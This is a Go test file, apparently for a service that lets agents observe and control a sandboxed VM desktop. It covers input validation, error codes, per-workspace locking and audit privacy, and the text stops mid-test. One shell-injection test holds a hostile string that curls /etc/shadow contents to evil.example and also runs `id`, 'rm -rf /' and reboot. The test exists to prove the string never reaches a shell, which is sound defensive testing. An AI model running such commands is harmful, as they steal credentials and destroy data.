package services

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/smithersai/smithers/packages/backend/internal/db"
	"github.com/smithersai/smithers/packages/backend/internal/sandbox"
	pkgerrors "github.com/smithersai/smithers/packages/backend/internal/pkg/errors"
)

// desktopWorkspaceQuerier serves one running kind=desktop workspace.
func desktopWorkspaceQuerier(mutate func(*db.Workspace)) *mockWorkspaceQuerier {
	return &mockWorkspaceQuerier{
		getWorkspaceByRepoFn: func(_ context.Context, arg db.GetWorkspaceByRepoParams) (db.Workspace, error) {
			workspace := sampleDBWorkspace(arg.ID)
			workspace.Kind = "desktop"
			workspace.Status = "running"
			workspace.VmID = "vm-desktop-1"
			if mutate != nil {
				mutate(&workspace)
			}
			return workspace, nil
		},
	}
}

func desktopObserveStdout(extra ...string) string {
	lines := []string{
		"geometry 1920 1080",
		"pointer 640 360",
		`focused {"id":"0x1","title":"Example","class":"Google-chrome","x":0,"y":0,"w":1920,"h":1040}`,
		`windows [{"id":"0x1","title":"Example","class":"Google-chrome","x":0,"y":0,"w":1920,"h":1040,"focused":true}]`,
		"text " + base64.StdEncoding.EncodeToString([]byte("hello screen")),
	}
	return strings.Join(append(lines, extra...), "\n") + "\n"
}

func desktopExecResult(status int32, stdout, stderr string) sandbox.ExecResult {
	return sandbox.ExecResult{StatusCode: &status, Stdout: stdout, Stderr: stderr}
}

func newDesktopService(q WorkspaceQuerier, vm *mockWorkspaceSandboxVMClient) *WorkspaceService {
	return newWorkspaceServiceForTests(q, WithWorkspaceSandboxClient(vm))
}

func TestObserveDesktop_ReadsTheScreen(t *testing.T) {
	var gotCommand string
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(_ context.Context, vmID string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
		assert.Equal(t, "vm-desktop-1", vmID)
		gotCommand = request.Command
		return desktopExecResult(0, desktopObserveStdout(), ""), nil
	}}

	observation, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
	require.NoError(t, err)

	assert.Equal(t, DesktopFrame{Width: 1920, Height: 1080}, observation.Frame)
	assert.Equal(t, DesktopPointer{X: 640, Y: 360}, observation.Pointer)
	require.NotNil(t, observation.Focused)
	assert.Equal(t, "Google-chrome", observation.Focused.Class)
	require.Len(t, observation.Windows, 1)
	assert.True(t, observation.Windows[0].Focused)
	require.NotNil(t, observation.Text)
	assert.Equal(t, "hello screen", *observation.Text)
	require.NotNil(t, observation.TextSource)
	assert.Equal(t, "chrome-cdp", *observation.TextSource)
	assert.Nil(t, observation.Image, "no capture unless the caller asks for one")

	// Text on, no image: the three integers the helper takes.
	assert.Contains(t, gotCommand, "smithers-desktop-observe 1 0 60")
	// Both lookup paths, and the activation check in front of them, so a guest
	// that is still booting is told apart from an image without the helpers.
	assert.Contains(t, gotCommand, "/usr/local/bin/smithers-desktop-observe")
	assert.Contains(t, gotCommand, "/run/current-system/sw/bin/smithers-desktop-observe")
	assert.Contains(t, gotCommand, "systemctl is-system-running")
}

func TestObserveDesktop_ReturnsTheCapture(t *testing.T) {
	jpeg := []byte("\xff\xd8\xff\xe0 not really a jpeg")
	encoded := base64.StdEncoding.EncodeToString(jpeg)
	var gotCommand string
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(_ context.Context, _ string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
		gotCommand = request.Command
		return desktopExecResult(0, desktopObserveStdout(
			"image "+strconv.Itoa(len(jpeg))+" 960 540", encoded), ""), nil
	}}

	width, quality := 960, 70
	observation, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{
			Image: &DesktopImageRequest{MaxWidth: &width, Quality: &quality},
		})
	require.NoError(t, err)
	require.NotNil(t, observation.Image)
	assert.Equal(t, "image/jpeg", observation.Image.ContentType)
	assert.Equal(t, "base64", observation.Image.Encoding)
	assert.Equal(t, encoded, observation.Image.Image)
	assert.Equal(t, len(jpeg), observation.Image.Bytes)
	assert.Equal(t, 960, observation.Image.ImageWidth)
	assert.Equal(t, 540, observation.Image.ImageHeight)
	assert.InDelta(t, 0.5, observation.Image.Scale, 0.0001)
	assert.Contains(t, gotCommand, "smithers-desktop-observe 1 960 70")
}

func TestObserveDesktop_RejectsOutOfRangeImageOptions(t *testing.T) {
	called := false
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
		called = true
		return desktopExecResult(0, "", ""), nil
	}}
	service := newDesktopService(desktopWorkspaceQuerier(nil), vm)

	for _, test := range []struct {
		name    string
		request DesktopObserveRequest
		message string
	}{
		{"narrow", desktopImageRequest(319, 60), "max_width must be between 320 and 1920"},
		{"wide", desktopImageRequest(1921, 60), "max_width must be between 320 and 1920"},
		{"blurry", desktopImageRequest(1280, 29), "quality must be between 30 and 85"},
		{"lossless", desktopImageRequest(1280, 86), "quality must be between 30 and 85"},
	} {
		t.Run(test.name, func(t *testing.T) {
			_, err := service.ObserveDesktop(context.Background(), "ws-1", 101, 1, test.request)
			apiErr := assertAPIErrorStatus(t, err, http.StatusBadRequest)
			assert.Equal(t, test.message, apiErr.Message)
		})
	}
	assert.False(t, called, "a rejected request never reaches the guest")
}

func desktopImageRequest(width, quality int) DesktopObserveRequest {
	return DesktopObserveRequest{Image: &DesktopImageRequest{MaxWidth: &width, Quality: &quality}}
}

func TestObserveDesktop_RefusesNonDesktopAndStoppedBoxes(t *testing.T) {
	t.Run("wrong kind", func(t *testing.T) {
		q := desktopWorkspaceQuerier(func(w *db.Workspace) { w.Kind = "container" })
		_, err := newDesktopService(q, &mockWorkspaceSandboxVMClient{}).
			ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
		apiErr := assertAPIErrorStatus(t, err, http.StatusBadRequest)
		assert.Equal(t, "this box has no desktop", apiErr.Message)
	})

	for _, test := range []struct {
		name   string
		mutate func(*db.Workspace)
	}{
		{"suspended", func(w *db.Workspace) { w.Status = "suspended" }},
		{"no vm", func(w *db.Workspace) { w.VmID = "" }},
	} {
		t.Run(test.name, func(t *testing.T) {
			resumed := false
			vm := &mockWorkspaceSandboxVMClient{startVMFn: func(context.Context, string, sandbox.StartRequest) (sandbox.StartResult, error) {
				resumed = true
				return sandbox.StartResult{}, nil
			}}
			_, err := newDesktopService(desktopWorkspaceQuerier(test.mutate), vm).
				ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
			apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
			assert.Equal(t, pkgerrors.CodeDesktopNotRunning, apiErr.Code)
			assert.Equal(t, "this box is not running; resume it first", apiErr.Message)
			assert.False(t, resumed, "observe never auto-resumes a box")
		})
	}
}

// TestDesktopExitCodesMapToVerdicts is the guest contract: every exit code the
// helpers use has exactly one HTTP meaning, and both routes agree on it.
func TestDesktopExitCodesMapToVerdicts(t *testing.T) {
	for _, test := range []struct {
		name       string
		status     int32
		stderr     string
		wantStatus int
		wantCode   pkgerrors.Code
	}{
		{"tools missing", 127, "", http.StatusConflict, pkgerrors.CodeDesktopToolsUnavailable},
		{"not activated", 69, "", http.StatusServiceUnavailable, pkgerrors.CodeDesktopNotReady},
		{"x not up", 70, "xdotool: unable to open X server", http.StatusServiceUnavailable, pkgerrors.CodeDesktopNotReady},
		{"display gone", 70, "import: Can't open display", http.StatusServiceUnavailable, pkgerrors.CodeDesktopNotReady},
		{"tool broke", 70, "xdotool: bad keysym", http.StatusInternalServerError, pkgerrors.CodeInternal},
		{"busy", 75, "", http.StatusConflict, pkgerrors.CodeDesktopBusy},
		{"replayed", 76, "", http.StatusConflict, pkgerrors.CodeDesktopActRepeated},
		{"image too big", 47, "", http.StatusInternalServerError, pkgerrors.CodeInternal},
		{"bad plan", 64, "", http.StatusInternalServerError, pkgerrors.CodeInternal},
	} {
		t.Run(test.name, func(t *testing.T) {
			vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
				return desktopExecResult(test.status, "", test.stderr), nil
			}}
			_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
				ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
			apiErr := assertAPIErrorStatus(t, err, test.wantStatus)
			assert.Equal(t, test.wantCode, apiErr.Code)
		})
	}
}

func TestObserveDesktop_ToolsUnavailableCarriesTheOpenANewBoxMessage(t *testing.T) {
	// Boxes booted from an image older than the helpers are the live case
	// today, so this message is the one a user actually reads.
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
		return desktopExecResult(127, "", ""), nil
	}}
	_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
	apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
	assert.Equal(t, "this box's image has no desktop tools; open a new box to get them", apiErr.Message)
}

func TestDesktopControl_SerializesPerWorkspace(t *testing.T) {
	entered := make(chan struct{})
	release := make(chan struct{})
	var once sync.Once
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
		first := false
		once.Do(func() { first = true; close(entered) })
		if first {
			<-release
		}
		return desktopExecResult(0, desktopObserveStdout(), ""), nil
	}}
	service := newDesktopService(desktopWorkspaceQuerier(nil), vm)

	var wait sync.WaitGroup
	wait.Add(1)
	go func() {
		defer wait.Done()
		_, err := service.ObserveDesktop(context.Background(), "ws-busy", 101, 1, DesktopObserveRequest{})
		assert.NoError(t, err)
	}()
	<-entered

	_, err := service.ObserveDesktop(context.Background(), "ws-busy", 101, 1, DesktopObserveRequest{})
	apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
	assert.Equal(t, pkgerrors.CodeDesktopBusy, apiErr.Code)
	assert.Equal(t, 1, apiErr.RetryAfter)

	close(release)
	wait.Wait()

	// The lock is released, so the next caller is served.
	_, err = service.ObserveDesktop(context.Background(), "ws-busy", 101, 1, DesktopObserveRequest{})
	assert.NoError(t, err)
}

func TestInputDesktop_RunsAPlanAndObservesAfterIt(t *testing.T) {
	var planJSON, planPath, command string
	vm := &mockWorkspaceSandboxVMClient{
		writeFileFn: func(_ context.Context, vmID, path string, request sandbox.WriteFileRequest) error {
			assert.Equal(t, "vm-desktop-1", vmID)
			planPath, planJSON = path, request.Content
			return nil
		},
		execAwaitFn: func(_ context.Context, _ string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
			command = request.Command
			return desktopExecResult(0, "geometry 1600 900\ncompleted 2\n"+desktopObserveStdout(), ""), nil
		},
	}

	x, y := 100, 200
	result, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
			ActID: "11111111-2222-3333-4444-555555555555",
			Actions: []DesktopInputAction{
				{Action: "click", X: &x, Y: &y, Button: "left"},
				{Action: "type", Text: "hello"},
			},
			Observe: &DesktopObserveRequest{},
		})
	require.NoError(t, err)
	assert.Equal(t, 2, result.Completed)
	assert.Equal(t, DesktopFrame{Width: 1600, Height: 900}, result.Frame)
	assert.Equal(t, "11111111-2222-3333-4444-555555555555", result.ActID)
	require.NotNil(t, result.Observation)
	assert.Equal(t, DesktopFrame{Width: 1920, Height: 1080}, result.Observation.Frame)
	assert.Nil(t, result.ObserveError)

	// The plan travels as a file, keyed by a 16-hex nonce.
	assert.Regexp(t, `^/run/smithers-desktop/agent/plan-[0-9a-f]{16}\.json$`, planPath)
	var written desktopGuestPlan
	require.NoError(t, json.Unmarshal([]byte(planJSON), &written))
	require.Len(t, written.Actions, 2)
	assert.Equal(t, "left", written.Actions[0].Button)
	assert.Equal(t, 1, written.Actions[0].Count, "an unstated count is a single click")
	assert.Equal(t, "hello", written.Actions[1].Text)
	assert.Equal(t, defaultDesktopSettleMS, written.SettleMS)
	assert.Contains(t, command, "smithers-desktop-input '")
	assert.Contains(t, command, "'11111111-2222-3333-4444-555555555555'")
}

func TestInputDesktop_AcceptsASingleActionBody(t *testing.T) {
	var planJSON string
	vm := &mockWorkspaceSandboxVMClient{
		writeFileFn: func(_ context.Context, _, _ string, request sandbox.WriteFileRequest) error {
			planJSON = request.Content
			return nil
		},
		execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
			return desktopExecResult(0, "geometry 1920 1080\ncompleted 1\n", ""), nil
		},
	}
	result, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
			ActID:              "11111111-2222-3333-4444-555555555555",
			DesktopInputAction: DesktopInputAction{Action: "key", Combo: "ctrl+l"},
		})
	require.NoError(t, err)
	assert.Equal(t, 1, result.Completed)
	assert.Contains(t, planJSON, `"combo":"ctrl+l"`)
}

// TestInputDesktop_HostileTypeTextCannotReachAShell is the safety property the
// whole design exists for: the provider's exec API takes a shell STRING, so a
// plan must never be interpolated into it.
func TestInputDesktop_HostileTypeTextCannotReachAShell(t *testing.T) {
	hostile := "'; curl http://evil.example/$(cat /etc/shadow) #\n`id`\n$(rm -rf /)\n\"&&reboot\""
	var command, planJSON string
	vm := &mockWorkspaceSandboxVMClient{
		writeFileFn: func(_ context.Context, _, _ string, request sandbox.WriteFileRequest) error {
			planJSON = request.Content
			return nil
		},
		execAwaitFn: func(_ context.Context, _ string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
			command = request.Command
			return desktopExecResult(0, "geometry 1920 1080\ncompleted 1\n", ""), nil
		},
	}

	_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
			ActID:   "11111111-2222-3333-4444-555555555555",
			Actions: []DesktopInputAction{{Action: "type", Text: hostile}},
		})
	require.NoError(t, err)

	// Not one fragment of the text is in the command.
	for _, fragment := range []string{"curl", "evil.example", "/etc/shadow", "rm -rf", "reboot", "`id`", "$(rm", "$(cat"} {
		assert.NotContains(t, command, fragment, "hostile text leaked into the exec command")
	}
	// The command is the fixed shim plus a nonce and a uuid, nothing else.
	assert.Regexp(t,
		`(?s)^state=\$\(systemctl is-system-running 2>/dev/null \|\| true\)\n`+
			`case "\$state" in running\|degraded\) ;; \*\) exit 69 ;; esac\n`+
			`if \[ -x /usr/local/bin/smithers-desktop-input \]; then exec /usr/local/bin/smithers-desktop-input '[0-9a-f]{16}' '[0-9a-f-]{36}'; fi\n`+
			`if \[ -x /run/current-system/sw/bin/smithers-desktop-input \]; then exec /run/current-system/sw/bin/smithers-desktop-input '[0-9a-f]{16}' '[0-9a-f-]{36}'; fi\n`+
			`exit 127$`, command)
	// It reaches the guest as one JSON string in a file instead.
	var written desktopGuestPlan
	require.NoError(t, json.Unmarshal([]byte(planJSON), &written))
	require.Len(t, written.Actions, 1)
	assert.Equal(t, hostile, written.Actions[0].Text)
}

// TestObserveDesktopCommandShapeIsFixed asserts the same property for observe:
// the command varies only in three integers the service bounded itself.
func TestObserveDesktopCommandShapeIsFixed(t *testing.T) {
	for _, observe := range []desktopGuestObserve{
		{Text: 1, MaxWidth: 0, Quality: 60},
		{Text: 0, MaxWidth: 1920, Quality: 85},
		{Text: 1, MaxWidth: 320, Quality: 30},
	} {
		command := desktopObserveCommand(observe)
		// Three integers and nothing else: the only substitution in the whole
		// string is the fixed activation probe the shim runs first.
		assert.Regexp(t,
			`(?s)^state=\$\(systemctl is-system-running 2>/dev/null \|\| true\)\n`+
				`case "\$state" in running\|degraded\) ;; \*\) exit 69 ;; esac\n`+
				`if \[ -x /usr/local/bin/smithers-desktop-observe \]; then exec /usr/local/bin/smithers-desktop-observe \d+ \d+ \d+; fi\n`+
				`if \[ -x /run/current-system/sw/bin/smithers-desktop-observe \]; then exec /run/current-system/sw/bin/smithers-desktop-observe \d+ \d+ \d+; fi\n`+
				`exit 127$`, command)
		assert.Equal(t, 1, strings.Count(command, "$("), "one substitution, the activation probe")
		assert.NotContains(t, command, "`")
	}
}

func TestInputDesktop_GuardedRefusals(t *testing.T) {
	plan := DesktopInputRequest{
		ActID:   "11111111-2222-3333-4444-555555555555",
		Actions: []DesktopInputAction{{Action: "type", Text: "rm -rf /"}},
	}

	t.Run("frame changed", func(t *testing.T) {
		vm := desktopInputVM(66, "geometry 1600 900\ncompleted 0\nfail {}\n"+desktopObserveStdout())
		_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
			InputDesktop(context.Background(), "ws-1", 101, 1, plan)
		apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
		assert.Equal(t, pkgerrors.CodeDesktopFrameChanged, apiErr.Code)
		details, ok := apiErr.Details.(desktopFrameChangedDetails)
		require.True(t, ok)
		assert.Equal(t, DesktopFrame{Width: 1600, Height: 900}, details.Frame)
		require.NotNil(t, details.Observation, "the caller gets the screen it should have aimed at")
	})

	t.Run("terminal focused", func(t *testing.T) {
		vm := desktopInputVM(67, "geometry 1920 1080\ncompleted 0\n"+
			`fail {"focused":{"id":"0x9","title":"developer@smithers","class":"Xfce4-terminal","x":0,"y":0,"w":800,"h":600}}`+"\n")
		_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
			InputDesktop(context.Background(), "ws-1", 101, 1, plan)
		apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
		assert.Equal(t, pkgerrors.CodeDesktopFocusTerminal, apiErr.Code)
		details, ok := apiErr.Details.(map[string]any)
		require.True(t, ok)
		focused, ok := details["focused"].(*DesktopWindow)
		require.True(t, ok)
		assert.Equal(t, "Xfce4-terminal", focused.Class)
	})

	t.Run("out of bounds", func(t *testing.T) {
		vm := desktopInputVM(65, "geometry 1600 900\ncompleted 2\n"+`fail {"index":3,"x":1700,"y":200}`+"\n")
		_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
			InputDesktop(context.Background(), "ws-1", 101, 1, plan)
		apiErr := assertAPIErrorStatus(t, err, http.StatusUnprocessableEntity)
		assert.Equal(t, pkgerrors.CodeDesktopInputOutOfBounds, apiErr.Code)
		assert.Equal(t, "action 3 at 1700,200 is outside the 1600x900 desktop", apiErr.Message)
		details, ok := apiErr.Details.(desktopOutOfBoundsDetails)
		require.True(t, ok)
		assert.Equal(t, desktopOutOfBoundsDetails{Width: 1600, Height: 900, Index: 3, Completed: 2}, details)
	})

	t.Run("act replayed", func(t *testing.T) {
		vm := desktopInputVM(76, "")
		_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
			InputDesktop(context.Background(), "ws-1", 101, 1, plan)
		apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
		assert.Equal(t, pkgerrors.CodeDesktopActRepeated, apiErr.Code)
	})

	t.Run("tools unavailable", func(t *testing.T) {
		vm := desktopInputVM(127, "")
		_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
			InputDesktop(context.Background(), "ws-1", 101, 1, plan)
		apiErr := assertAPIErrorStatus(t, err, http.StatusConflict)
		assert.Equal(t, pkgerrors.CodeDesktopToolsUnavailable, apiErr.Code)
	})
}

func desktopInputVM(status int32, stdout string) *mockWorkspaceSandboxVMClient {
	return &mockWorkspaceSandboxVMClient{
		writeFileFn: func(context.Context, string, string, sandbox.WriteFileRequest) error { return nil },
		execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
			return desktopExecResult(status, stdout, ""), nil
		},
	}
}

func TestInputDesktop_ReportsAFailedPostPlanObservation(t *testing.T) {
	// The plan ran; only the observation after it did not. That is a field on
	// a 200, never an error: reporting it as a failure would make a caller
	// retry an input that already happened.
	vm := desktopInputVM(0, "geometry 1920 1080\ncompleted 1\n")
	result, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
		InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
			ActID:   "11111111-2222-3333-4444-555555555555",
			Actions: []DesktopInputAction{{Action: "move", X: intPtr(10), Y: intPtr(10)}},
			Observe: &DesktopObserveRequest{},
		})
	require.NoError(t, err)
	assert.Equal(t, 1, result.Completed)
	assert.Nil(t, result.Observation)
	require.NotNil(t, result.ObserveError)
	assert.Equal(t, "desktop_observe_failed", result.ObserveError.Code)
}

func TestInputDesktop_ValidatesBeforeTouchingTheGuest(t *testing.T) {
	touched := false
	vm := &mockWorkspaceSandboxVMClient{
		writeFileFn: func(context.Context, string, string, sandbox.WriteFileRequest) error {
			touched = true
			return nil
		},
		execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
			touched = true
			return desktopExecResult(0, "", ""), nil
		},
	}
	service := newDesktopService(desktopWorkspaceQuerier(nil), vm)

	_, err := service.InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
		Actions: []DesktopInputAction{{Action: "move", X: intPtr(1), Y: intPtr(1)}},
	})
	apiErr := assertAPIErrorStatus(t, err, http.StatusBadRequest)
	assert.Equal(t, "act_id is required", apiErr.Message)
	assert.False(t, touched, "an invalid plan never reaches the guest")
}

func TestDesktopTransportFailureAsksTheProviderOnce(t *testing.T) {
	for _, test := range []struct {
		name       string
		state      sandbox.State
		wantStatus int
		wantCode   pkgerrors.Code
	}{
		{"stopped under us", sandbox.StateStopped, http.StatusConflict, pkgerrors.CodeDesktopNotRunning},
		{"still running", sandbox.StateRunning, http.StatusInternalServerError, pkgerrors.CodeInternal},
	} {
		t.Run(test.name, func(t *testing.T) {
			inspects := 0
			vm := &mockWorkspaceSandboxVMClient{
				execAwaitFn: func(context.Context, string, sandbox.ExecRequest) (sandbox.ExecResult, error) {
					return sandbox.ExecResult{}, assert.AnError
				},
				getVMFn: func(context.Context, string) (sandbox.Sandbox, error) {
					inspects++
					return sandbox.Sandbox{State: test.state}, nil
				},
			}
			_, err := newDesktopService(desktopWorkspaceQuerier(nil), vm).
				ObserveDesktop(context.Background(), "ws-1", 101, 1, DesktopObserveRequest{})
			apiErr := assertAPIErrorStatus(t, err, test.wantStatus)
			assert.Equal(t, test.wantCode, apiErr.Code)
			assert.Equal(t, 1, inspects, "exactly one inspect, never a resume loop")
		})
	}
}

func TestDesktopExecTimeoutFitsTheRequestDeadline(t *testing.T) {
	// No deadline: the ceiling.
	assert.Equal(t, int64(15000), *desktopExecTimeoutMS(context.Background(), desktopObserveExecCeilingMS))
	assert.Equal(t, int64(20000), *desktopExecTimeoutMS(context.Background(), desktopInputExecCeilingMS))

	// A 30 s request keeps 1.5 s of headroom for the round trip.
	ctx, cancel := context.WithTimeout(context.Background(), 10*1000*1000*1000)
	defer cancel()
	assert.LessOrEqual(t, *desktopExecTimeoutMS(ctx, desktopInputExecCeilingMS), int64(8500))

	// A nearly expired deadline floors rather than sending a 0 ms exec.
	expiring, cancelExpiring := context.WithTimeout(context.Background(), 1)
	defer cancelExpiring()
	assert.Equal(t, int64(desktopExecFloorMS), *desktopExecTimeoutMS(expiring, desktopObserveExecCeilingMS))
}

func TestParseDesktopObservationRejectsMalformedGuestOutput(t *testing.T) {
	for _, stdout := range []string{
		"",
		"geometry 1920\n",
		"geometry 0 0\npointer 1 1\nfocused -\nwindows []\ntext -\n",
		"geometry 1920 1080\nmouse 1 1\nfocused -\nwindows []\ntext -\n",
		"geometry 1920 1080\npointer 1 1\nfocused {oops\nwindows []\ntext -\n",
		"geometry 1920 1080\npointer 1 1\nfocused -\nwindows nope\ntext -\n",
		"geometry 1920 1080\npointer 1 1\nfocused -\nwindows []\ntext !!!not-base64!!!\n",
	} {
		_, err := parseDesktopObservation("ws-1", stdout)
		assertAPIErrorStatus(t, err, http.StatusInternalServerError)
	}
}

func TestParseDesktopObservationBoundsUntrustedStrings(t *testing.T) {
	// A window title and screen text are chosen by whatever the box displays.
	long := strings.Repeat("A", 500)
	stdout := strings.Join([]string{
		"geometry 1920 1080",
		"pointer 0 0",
		`focused {"id":"0x1","title":"` + long + `","class":"` + long + `","x":0,"y":0,"w":1,"h":1}`,
		`windows []`,
		"text " + base64.StdEncoding.EncodeToString([]byte("keep\x1b[31mthis\x07clean"+strings.Repeat("z", 4000))),
	}, "\n") + "\n"

	observation, err := parseDesktopObservation("ws-1", stdout)
	require.NoError(t, err)
	assert.Len(t, observation.Focused.Title, maxDesktopWindowTitle)
	assert.Len(t, observation.Focused.Class, maxDesktopWindowClass)
	require.NotNil(t, observation.Text)
	assert.NotContains(t, *observation.Text, "\x1b")
	assert.NotContains(t, *observation.Text, "\x07")
	assert.LessOrEqual(t, len([]rune(*observation.Text)), maxDesktopText)
}

func TestParseDesktopObservationCapsTheWindowList(t *testing.T) {
	windows := make([]map[string]any, 0, 40)
	for i := 0; i < 40; i++ {
		windows = append(windows, map[string]any{"id": "0x1", "title": "w", "class": "c", "x": 0, "y": 0, "w": 1, "h": 1})
	}
	encoded, err := json.Marshal(windows)
	require.NoError(t, err)
	stdout := "geometry 1920 1080\npointer 0 0\nfocused -\nwindows " + string(encoded) + "\ntext -\n"

	observation, parseErr := parseDesktopObservation("ws-1", stdout)
	require.NoError(t, parseErr)
	assert.Len(t, observation.Windows, maxDesktopWindows)
}

func TestParseDesktopImageRejectsATruncatedCapture(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("abc"))
	for _, header := range []string{"image 99 10 10", "image 3 0 10", "image 3 10", "pixels 3 10 10"} {
		_, err := parseDesktopImage(header, payload, DesktopFrame{Width: 100, Height: 100})
		assertAPIErrorStatus(t, err, http.StatusInternalServerError)
	}
}

func intPtr(value int) *int { return &value }

// auditingWorkspaceQuerier adds the optional audit surface the real generated
// querier has.
type auditingWorkspaceQuerier struct {
	*mockWorkspaceQuerier
	mu   sync.Mutex
	rows []db.InsertAuditLogParams
}

func (q *auditingWorkspaceQuerier) InsertAuditLog(_ context.Context, arg db.InsertAuditLogParams) error {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.rows = append(q.rows, arg)
	return nil
}

func (q *auditingWorkspaceQuerier) recorded() []db.InsertAuditLogParams {
	q.mu.Lock()
	defer q.mu.Unlock()
	return append([]db.InsertAuditLogParams(nil), q.rows...)
}

// TestDesktopControlAuditNeverRecordsTypedText is the privacy property of the
// audit trail: it says an agent typed 28 characters into the box, never which.
func TestDesktopControlAuditNeverRecordsTypedText(t *testing.T) {
	q := &auditingWorkspaceQuerier{mockWorkspaceQuerier: desktopWorkspaceQuerier(nil)}
	vm := desktopInputVM(0, "geometry 1920 1080\ncompleted 2\n")

	_, err := newDesktopService(q, vm).InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
		ActID: "11111111-2222-3333-4444-555555555555",
		Actions: []DesktopInputAction{
			{Action: "click", X: intPtr(10), Y: intPtr(20)},
			{Action: "type", Text: "hunter2 is the password"},
		},
	})
	require.NoError(t, err)

	var rows []db.InsertAuditLogParams
	for attempt := 0; attempt < 200 && len(rows) == 0; attempt++ {
		rows = q.recorded()
		if len(rows) == 0 {
			time.Sleep(5 * time.Millisecond)
		}
	}
	require.Len(t, rows, 1)
	row := rows[0]
	assert.Equal(t, "workspace.desktop.input", row.EventType)
	assert.Equal(t, "input", row.Action)
	assert.Equal(t, "workspace", row.TargetType)
	assert.Equal(t, "ws-1", row.TargetName)
	assert.Equal(t, int64(1), row.ActorID.Int64)
	assert.True(t, row.ActorID.Valid)

	metadata := string(row.Metadata)
	assert.NotContains(t, metadata, "hunter2")
	assert.Contains(t, metadata, `"text_chars":23`)
	assert.Contains(t, metadata, `"act_id":"11111111-2222-3333-4444-555555555555"`)
	assert.Contains(t, metadata, `"completed":2`)
	assert.Contains(t, metadata, `"vm_id":"vm-desktop-1"`)
}

// TestObserveDesktop_TextSwitchIsAnOperatorKillSwitch covers the deployment
// lever over the prompt-injection channel: with screen text disabled, a
// caller that asks for it still gets a 200 — the guest is simply told not to
// read it. Failing the request instead would break every client for a setting
// none of them can see.
func TestObserveDesktop_TextSwitchIsAnOperatorKillSwitch(t *testing.T) {
	var gotCommand string
	vm := &mockWorkspaceSandboxVMClient{execAwaitFn: func(_ context.Context, _ string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
		gotCommand = request.Command
		return desktopExecResult(0, "geometry 1920 1080\npointer 0 0\nfocused -\nwindows []\ntext -\n", ""), nil
	}}
	service := newWorkspaceServiceForTests(desktopWorkspaceQuerier(nil),
		WithWorkspaceSandboxClient(vm), WithWorkspaceDesktopObserveText(false))

	on := true
	observation, err := service.ObserveDesktop(context.Background(), "ws-1", 101, 1,
		DesktopObserveRequest{Text: &on})
	require.NoError(t, err)
	assert.Nil(t, observation.Text)
	assert.Nil(t, observation.TextSource)
	assert.Contains(t, gotCommand, "smithers-desktop-observe 0 0 60")

	// The same switch governs an input plan's post-plan observation.
	inputVM := &mockWorkspaceSandboxVMClient{
		writeFileFn: func(context.Context, string, string, sandbox.WriteFileRequest) error { return nil },
		execAwaitFn: func(_ context.Context, _ string, request sandbox.ExecRequest) (sandbox.ExecResult, error) {
			return desktopExecResult(0, "geometry 1920 1080\ncompleted 1\n", ""), nil
		},
	}
	var planJSON string
	inputVM.writeFileFn = func(_ context.Context, _, _ string, request sandbox.WriteFileRequest) error {
		planJSON = request.Content
		return nil
	}
	inputService := newWorkspaceServiceForTests(desktopWorkspaceQuerier(nil),
		WithWorkspaceSandboxClient(inputVM), WithWorkspaceDesktopObserveText(false))
	_, err = inputService.InputDesktop(context.Background(), "ws-1", 101, 1, DesktopInputRequest{
		ActID:              "11111111-2222-3333-4444-555555555555",
